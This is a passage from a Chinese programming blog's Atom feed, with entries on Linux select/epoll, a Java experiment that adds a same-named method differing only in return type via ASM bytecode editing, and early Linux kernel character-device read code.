      &lt;p&gt;&lt;a href=&quot;./2019-01-15-understand-Kernel-8/&quot;&gt;前一篇&lt;/a&gt;已经对 Linux 内核网络相关的内容进行了基础性的介绍。数据从到达网卡，到最终被用户进程获取，最少经过了三个进程/硬中断的配合：网络中断负责将网络接收到的数据读取到内存并添加到 softnet_data 队列，并设置软中断通知内核进程 ksoftirqd；内核进程 ksoftirqd 被调度并处于运行状态，处理位于 softnet_data 中的 &lt;code&gt;struct sock&lt;/code&gt; 对象，将其逐级从网络接口层逐级提升到网络层、传输层…最终添加到接收队列 &lt;code&gt;sk_receive_queue&lt;/code&gt; 中；用户进程通过 &lt;code&gt;read&lt;/code&gt;、&lt;code&gt;recv&lt;/code&gt;、&lt;code&gt;recvfrom&lt;/code&gt; 等命令检查并获取 &lt;code&gt;sk_receive_queue&lt;/code&gt; 中的数据。&lt;/p&gt;
&lt;p&gt;整个流程从概述上可以很轻松地配合进行网络数据交互，但如果要监控多个网络套接字呢？处理流程将变得复杂。我们无法预知哪个套接字能优先接收到数据。因此，最直接的办法就是轮询，在用户程序硬编码，通过设置超时时间的方式尝试获取数据。当然，这个效率就相当低下了。每次试探都需要触发系统调用（要知道这代价可是相当大的），另外超时时间的设置也是一个硬性的阻塞式消耗。&lt;/p&gt;
&lt;p&gt;那么，有没有解决方案呢？当然有。通过用户程序硬编码式的轮询显然是陷入性能瓶颈的根源。因此内核主动提供了轮询式的系统调用（&lt;code&gt;select&lt;/code&gt;, &lt;code&gt;poll&lt;/code&gt;, &lt;code&gt;epoll&lt;/code&gt;）。通过将轮询逻辑下沉到内核态，系统调用就只会有一次，而且超时时间的设置也显得统一。本篇就要就 &lt;code&gt;select&lt;/code&gt; 和 &lt;code&gt;epoll&lt;/code&gt; 两类系统调用的实现进行探究。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://DorMOUSE-None.github.io/tags/Linux/"/>
    
      <category term="Kernel" scheme="https://DorMOUSE-None.github.io/tags/Kernel/"/>
    
      <category term="IO Model" scheme="https://DorMOUSE-None.github.io/tags/IO-Model/"/>
    
  </entry>
  
  <entry>
    <title>【Java】API 参数误定义的后果</title>
    <link href="https://DorMOUSE-None.github.io/2019-02-27-Java-Fatal-API/"/>
    <id>https://DorMOUSE-None.github.io/2019-02-27-Java-Fatal-API/</id>
    <published>2019-02-26T16:00:00.000Z</published>
    <updated>2019-02-27T22:55:02.662Z</updated>
    
    <content type="html"><![CDATA[<p>工程项目中，定义 API 总是一个慎之又慎的操作。不能少，不满足调用方的需求就惨了；也不能多，不然就乱套了，自己维护困难，调用方也开始了自我发挥。虽然足够慎重，但绝大多数都逃不过最终不得不“改” API 的情况。今天要讨论的是在同一个类内同方法名不同参数（入参/出参）的情况。</p><p>想要做到同方法名不同入参，很简单，就是“重载（Overload）”，日常都在使用。不再赘述！</p><p>想要做到同方法名不同出参，答案就不再那么肯定了。当然，如果问把<code>void add(int)</code> API 改写成 <code>int add(int)</code>，可能得到的大多数回答都是可以。</p><a id="more"></a><h2 id="看山是山"><a href="#看山是山" class="headerlink" title="看山是山"></a>看山是山</h2><p>首先举一个具体点的例子来描述（为了方便，就不定义<code>CountService</code>的接口类了）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ffutop.signature;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 主类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> fangfeng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2019-02-26</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        CountService countService = <span class="keyword">new</span> CountService();</span><br><span class="line">        countService.add(<span class="number">1</span>);</span><br><span class="line">        System.out.println(String.format(<span class="string">"currentValue = %d"</span>, countService.getCurrentValue()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ffutop.signature;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> fangfeng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2019-02-26</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CountService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> currentValue = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 请把 add(int) 理解成 API</span></span><br><span class="line"><span class="comment">     * 虽然已经做了实现</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> addend)</span> </span>&#123;</span><br><span class="line">        currentValue += addend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCurrentValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> currentValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在已经有 <code>void add(int)</code> 方法，完成的工作是累加。现在要把 API 改成 <code>int add(int)</code>，是否可以呢？看似本来没有返回值，现在只是加上一个返回值，对于原来的代码没有任何问题，而新代码又能拿到int类型的返回值，皆大欢喜啊。</p><h2 id="看山不是山"><a href="#看山不是山" class="headerlink" title="看山不是山"></a>看山不是山</h2><p>先给大家执行下代码吧！（请严格按照顺序，且避免使用IDE，否则将得不到预想的结果）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="comment"># 准备好两个类的代码（CountService的API是 `void add(int)`）</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="comment"># 编译Main类</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> javac com/ffutop/signature/Main.java</span></span><br><span class="line"><span class="meta">$</span><span class="bash">  </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="comment"># 修改CountService的API为`int add(int)`</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="comment"># 编译 CountService 类</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> javac com/ffutop/signature/CountService.java</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="comment"># 执行主程序</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> java com.ffutop.signature.Main</span></span><br><span class="line">Exception in thread "main" java.lang.NoSuchMethodError: com.ffutop.signature.CountService.add(I)V</span><br><span class="line">at com.ffutop.signature.Main.main(Main.java:11)</span><br></pre></td></tr></table></figure><p>很遗憾，执行失败了，报了个Error（没有这样的方法）。方法写的是 <code>com.ffutop.signature.CountService.add(I)V</code> 。简单的翻译一下就是需要<code>类名+方法名=x.y.CountService.add</code>，且入参为int，出参为void的方法（想了解更多请优先学习<a href="https://docs.oracle.com/javase/specs/jvms/se9/html/jvms-4.html#jvms-4.4" target="_blank" rel="noopener">Java ClassFile Format</a>）。</p><p>那么，现在得到的结论是不行。</p><h2 id="看山还是山"><a href="#看山还是山" class="headerlink" title="看山还是山"></a>看山还是山</h2><p>那么，就一定不行吗？都是同名方法，不同参数。凭什么改个入参是可以的，改个出参就不行了。</p><p>从 Java 的角度来说，一定不行。“同一类中不能存在两个名字及描述符完全相同的方法”</p><p>但是，如果从 JVM 的角度来说，完全是可行的。“在class文件中，两个方法可以拥有完全相同的特征签名，前提是返回值不能相同”</p><p>什么意思呢？我们都知道建立在 JVM 之上的语言不只有 Java。像 Groovy、Kotlin 等语言都实现了各自的区别于 Java 独有的特征。这些特征的实现都是依赖于 JVM，但为什么 Java 没有呢？只能说 Java 语言的规范是 JVM 的子集（好像这话有点不严谨啊）</p><p>通过直接操作字节码，就能够达到在同一个类中建立两个同名、相同入参，但返回值不同的方法。<br>先通过<code>javap</code>命令看看最终提供的<code>CountService.class</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> javap com.ffutop.signature.CountService</span></span><br><span class="line">public class com.ffutop.signature.CountService &#123;</span><br><span class="line">  public int add(int);</span><br><span class="line">  public com.ffutop.signature.CountService();</span><br><span class="line">  public void add(int);</span><br><span class="line">  public int getCurrentValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有两个同名的方法<code>add(int)</code>，至于执行，也会相当顺利。</p><p>还是写个程序来说明，在原有 <code>Main.java</code> 的基础上，再创建一个全限定名为 <code>com.ffutop.signature.other.Main2</code> 的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ffutop.signature.other;</span><br><span class="line"><span class="keyword">import</span> com.ffutop.signature.CountService;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> fangfeng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2019-02-27</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        CountService countService = <span class="keyword">new</span> CountService();</span><br><span class="line">        System.out.println(String.format(<span class="string">"currentValue = %d"</span>, countService.add(<span class="number">1</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与 Main.java 比较，很明显的就是一个调用了 <code>CountService</code> 的 <code>int add(int)</code> 方法，而另一个调用 <code>void add(int)</code> 方法。</p><p>那么是否有效呢？先来验证一下（这里要模拟的一个场景是，CountService 类(只有 <code>void add(int)</code> 方法)作为二方库C.jar version 1.0 的主要服务类。CountService 类(同时有 <code>void add(int)</code> 和 <code>int add(int)</code> 方法)作为二方库C.jar version 2.0 的主要服务类。Main 类根据 C.jar version 1.0 做的编译，而 Main2 类根据 C.jar version 2.0 做的编译。在 Main 和 Main2 类运行时只提供 C.jar version 2.0）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="comment"># 编译 Main 类和 CountService 类</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> javac com/ffutop/signature/Main.java</span></span><br><span class="line"><span class="meta">$</span><span class="bash"></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="comment"># 操作 CountService.class 字节码，增加方法 `int add(int)` </span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="comment"># 通过 ASM 实现，详见附录源码 com/ffutop/signature/support/Generator.java</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="comment"># 编译 Main2 类 (提供 classpath，即根据 CountService.class 编译)</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> javac com/ffutop/signature/other/Main2.java -classpath .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="comment"># 验证</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> java com.ffutop.signature.Main</span></span><br><span class="line">currentValue = 1</span><br><span class="line"><span class="meta">$</span><span class="bash"> java com.ffutop.signature.other.Main2</span></span><br><span class="line">currentValue = 1</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="comment"># OK，验证通过</span></span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一旦 API 定义错误，并已经作为二方库提供给调用方。后果必然是灾难性的。至少，只能重新定义 API 。如果对于入参定义错误，Java 语言级别也能够支持。但如果是返回值，如果非要保持方法名一致，那就不得不下沉到 JVM 级别来进行处理了。当然，在工程项目中是否应该直接操作字节码？至少个人还没直接接触过。</p><p>做个记录，未来可以翻一翻，至少是一种可行的解决方案。</p><p>Update: 如果直接操作字节码为添加了不同返回值的同名同参数方法，可能引起调用方静态编译失败。此操作需慎之又慎。也许提供类加载器加载时的字节码操作能更加完美地解决这个问题。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://raw.githubusercontent.com/DorMOUSE-None/Repo/master/signature.zip" target="_blank" rel="noopener">源码.zip</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;工程项目中，定义 API 总是一个慎之又慎的操作。不能少，不满足调用方的需求就惨了；也不能多，不然就乱套了，自己维护困难，调用方也开始了自我发挥。虽然足够慎重，但绝大多数都逃不过最终不得不“改” API 的情况。今天要讨论的是在同一个类内同方法名不同参数（入参/出参）的情况。&lt;/p&gt;
&lt;p&gt;想要做到同方法名不同入参，很简单，就是“重载（Overload）”，日常都在使用。不再赘述！&lt;/p&gt;
&lt;p&gt;想要做到同方法名不同出参，答案就不再那么肯定了。当然，如果问把&lt;code&gt;void add(int)&lt;/code&gt; API 改写成 &lt;code&gt;int add(int)&lt;/code&gt;，可能得到的大多数回答都是可以。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://DorMOUSE-None.github.io/tags/Java/"/>
    
      <category term="API" scheme="https://DorMOUSE-None.github.io/tags/API/"/>
    
  </entry>
  
  <entry>
    <title>字符集与字符编码</title>
    <link href="https://DorMOUSE-None.github.io/2019-02-02-unicode/"/>
    <id>https://DorMOUSE-None.github.io/2019-02-02-unicode/</id>
    <published>2019-02-01T16:00:00.000Z</published>
    <updated>2019-02-02T06:32:39.666Z</updated>
    
    <content type="html"><![CDATA[<div class="row"><iframe src="https://drive.google.com/file/d/1MuBNtZPMWCt9kGlpqiAtG3i3Al2MaknY/preview" style="width:100%; height:550px"></iframe></div>]]></content>
    
    <summary type="html">
    
      
      
        

	&lt;div class=&quot;row&quot;&gt;
		&lt;iframe src=&quot;https://drive.google.com/file/d/1MuBNtZPMWCt9kGlpqiAtG3i3Al2MaknY/preview&quot; style=&quot;width:100%; height:550
      
    
    </summary>
    
    
      <category term="Unicode" scheme="https://DorMOUSE-None.github.io/tags/Unicode/"/>
    
      <category term="Character Encoding" scheme="https://DorMOUSE-None.github.io/tags/Character-Encoding/"/>
    
  </entry>
  
  <entry>
    <title>理解 Linux Kernel (8) - 网络</title>
    <link href="https://DorMOUSE-None.github.io/2019-01-15-understand-Kernel-8/"/>
    <id>https://DorMOUSE-None.github.io/2019-01-15-understand-Kernel-8/</id>
    <published>2019-01-14T16:00:00.000Z</published>
    <updated>2019-01-15T06:05:20.845Z</updated>
    
    <content type="html"><![CDATA[<div class="row"><iframe src="https://drive.google.com/file/d/1l5Vjrs8vKy6b9EvZFP7c7hOblv2kHgNx/preview" style="width:100%; height:550px"></iframe></div>]]></content>
    
    <summary type="html">
    
      
      
        

	&lt;div class=&quot;row&quot;&gt;
		&lt;iframe src=&quot;https://drive.google.com/file/d/1l5Vjrs8vKy6b9EvZFP7c7hOblv2kHgNx/preview&quot; style=&quot;width:100%; height:550
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://DorMOUSE-None.github.io/tags/Linux/"/>
    
      <category term="Kernel" scheme="https://DorMOUSE-None.github.io/tags/Kernel/"/>
    
      <category term="Network" scheme="https://DorMOUSE-None.github.io/tags/Network/"/>
    
  </entry>
  
  <entry>
    <title>理解 Linux Kernel (7) - 字符设备</title>
    <link href="https://DorMOUSE-None.github.io/2018-12-28-understand-Kernel-7/"/>
    <id>https://DorMOUSE-None.github.io/2018-12-28-understand-Kernel-7/</id>
    <published>2018-12-27T16:00:00.000Z</published>
    <updated>2018-12-27T23:47:28.308Z</updated>
    
    <content type="html"><![CDATA[<p>相比较于块设备，字符设备无论从物理认知上，抑或是理论理解上，都存在着相当大的入门门槛。特别是在将字符设备与控制台、命令行终端混淆的时候，就更加难以进行分辨了。</p><p>回到字符设备本身，字符设备与块设备最主要的区别就在于块设备可以随机读写，而字符设备只能够顺序读，顺序写。</p><p>那么，常见的字符设备有什么？显示器、键盘、鼠标。</p><a id="more"></a><h2 id="宏观概览"><a href="#宏观概览" class="headerlink" title="宏观概览"></a>宏观概览</h2><p>通常在我们的认识中，命令行终端就被认为是与一套字符设备相配合来使用的。很正常嘛。我们打开一个 Shell ，通过键盘输入一些字符，配合显示器把这些经过加工的字符展示出来。</p><p>那么，是不是就意味着 Shell 作为一个任务(进程)，以键盘设备作为标准输入，以显示设备作为标准输出?</p><p>看看一个 1 号任务 <code>/bin/bash</code> 的文件描述符说明吧。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al</span><br><span class="line">total 0</span><br><span class="line">dr-x------ 2 root root  0 Dec 13 23:20 .</span><br><span class="line">dr-xr-xr-x 9 root root  0 Dec 13 23:20 ..</span><br><span class="line">lrwx------ 1 root root 64 Dec 13 23:20 0 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 root root 64 Dec 13 23:20 1 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 root root 64 Dec 13 23:20 2 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 root root 64 Dec 25 01:09 255 -&gt; /dev/pts/0</span><br></pre></td></tr></table></figure><p>这里文件描述符 0, 1, 2 分别表示任务的标准输入、标准输出、标准错误。这些内容在表现形式上做了一个链接。</p><p>那么，<code>/dev/pts/0</code> 是什么? </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crw--w---- 1 root tty 136, 0 Dec 13 23:20 /dev/pts/0</span><br></pre></td></tr></table></figure><p>一个字符设备。到此为止，似乎和最初预想的有比较大的区别。至少在假象中，至少是一个输入(键盘)，一个输出(显示器)。怎么就混成了一个呢？</p><p>本来是怎么都想不通的，但后来配合”Unix一切皆文件”的信条，总算是有点明白了。</p><p>相信大家都有这这样的经历，某个程序是以键盘输入作为标准输入的。其实就和上面👆展示的一样 <code>0 -&gt; /dev/pts/0</code> 。那么，有没有考虑过这整套流程是怎么协作的呢？</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fyjvtjiu0zj31980oqmxe.jpg" alt=""></p><p>对于程序来说，我们还是普通的调用 <code>read</code>, <code>write</code> 等经过封装的函数，来读取一个所谓的文件。</p><p>但对于文件是字符设备时，最终调用的就是 <code>tty_read</code>, <code>tty_write</code> 了。通俗的讲，大概率的就是键盘作为输入，显示器作为输出了。</p><h2 id="源码剖析"><a href="#源码剖析" class="headerlink" title="源码剖析"></a>源码剖析</h2><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><p>这部分上一篇已经介绍过了，不做过多说明。</p><p>简单回顾下 <code>sys_read</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_read</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd,<span class="keyword">char</span> * buf,<span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">inode</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fd&gt;=NR_OPEN || count&lt;<span class="number">0</span> || !(file=current-&gt;filp[fd]))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (!count)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">verify_area(buf,count);</span><br><span class="line">inode = file-&gt;f_inode;</span><br><span class="line"><span class="keyword">if</span> (inode-&gt;i_pipe)</span><br><span class="line"><span class="keyword">return</span> (file-&gt;f_mode&amp;<span class="number">1</span>)?read_pipe(inode,buf,count):-EIO;</span><br><span class="line">    <span class="comment">/* 确认到i节点描述的是字符设备 */</span></span><br><span class="line"><span class="keyword">if</span> (S_ISCHR(inode-&gt;i_mode)) </span><br><span class="line"><span class="keyword">return</span> rw_char(READ,inode-&gt;i_zone[<span class="number">0</span>],buf,count,&amp;file-&gt;f_pos);</span><br><span class="line"><span class="keyword">if</span> (S_ISBLK(inode-&gt;i_mode))</span><br><span class="line"><span class="keyword">return</span> block_read(inode-&gt;i_zone[<span class="number">0</span>],&amp;file-&gt;f_pos,buf,count);</span><br><span class="line"><span class="keyword">if</span> (S_ISDIR(inode-&gt;i_mode) || S_ISREG(inode-&gt;i_mode)) &#123;</span><br><span class="line"><span class="keyword">if</span> (count+file-&gt;f_pos &gt; inode-&gt;i_size)</span><br><span class="line">count = inode-&gt;i_size - file-&gt;f_pos;</span><br><span class="line"><span class="keyword">if</span> (count&lt;=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> file_read(inode,file,buf,count);</span><br><span class="line">&#125;</span><br><span class="line">printk(<span class="string">"(Read)inode-&gt;i_mode=%06o\n\r"</span>,inode-&gt;i_mode);</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 <code>S_ISCHR()</code> 就是在对i节点的类型进行判别，从而进行不同的分发。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> crw_ptr crw_table[]=&#123;</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">/* nodev */</span></span><br><span class="line">rw_memory,<span class="comment">/* /dev/mem etc */</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">/* /dev/fd */</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">/* /dev/hd */</span></span><br><span class="line">rw_ttyx,<span class="comment">/* /dev/ttyx */</span></span><br><span class="line">rw_tty,<span class="comment">/* /dev/tty */</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">/* /dev/lp */</span></span><br><span class="line"><span class="literal">NULL</span>&#125;;<span class="comment">/* unnamed pipes */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 这段还是涉及到分发，由不同的设备号(dev) 来确定执行函数 (ttyx, 串口终端; tty, 控制台终端; mem, /dev/mem 等)</span></span><br><span class="line"><span class="comment"> * crw_ptr 是 C 语言中常见的函数指针。由dev号来确定调用哪个函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rw_char</span><span class="params">(<span class="keyword">int</span> rw,<span class="keyword">int</span> dev, <span class="keyword">char</span> * buf, <span class="keyword">int</span> count, <span class="keyword">off_t</span> * pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">crw_ptr call_addr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (MAJOR(dev)&gt;=NRDEVS)</span><br><span class="line"><span class="keyword">return</span> -ENODEV;</span><br><span class="line"><span class="keyword">if</span> (!(call_addr=crw_table[MAJOR(dev)]))</span><br><span class="line"><span class="keyword">return</span> -ENODEV;</span><br><span class="line"><span class="keyword">return</span> call_addr(rw,MINOR(dev),buf,count,pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行到 <code>rw_tty</code>, <code>rw_ttyx</code> 两个函数，就将对读/写进行区分，并由特定的函数进行处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rw_ttyx</span><span class="params">(<span class="keyword">int</span> rw,<span class="keyword">unsigned</span> minor,<span class="keyword">char</span> * buf,<span class="keyword">int</span> count,<span class="keyword">off_t</span> * pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ((rw==READ)?tty_read(minor,buf,count):</span><br><span class="line">tty_write(minor,buf,count));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rw_tty</span><span class="params">(<span class="keyword">int</span> rw,<span class="keyword">unsigned</span> minor,<span class="keyword">char</span> * buf,<span class="keyword">int</span> count, <span class="keyword">off_t</span> * pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (current-&gt;tty&lt;<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"><span class="keyword">return</span> rw_ttyx(rw,current-&gt;tty,buf,count,pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此为止，应该能够基本了解了字符设备，作为 Linux 的文件，所应该有的读写的相关支持。</p><p>但是，究竟读、写的内容在哪呢？比如正规文件，都很容易地可以理解到，就是从磁盘中取出某个/某几个盘块的内容即可。字符设备的IO要从哪里取(往哪里送)数据呢?</p><h3 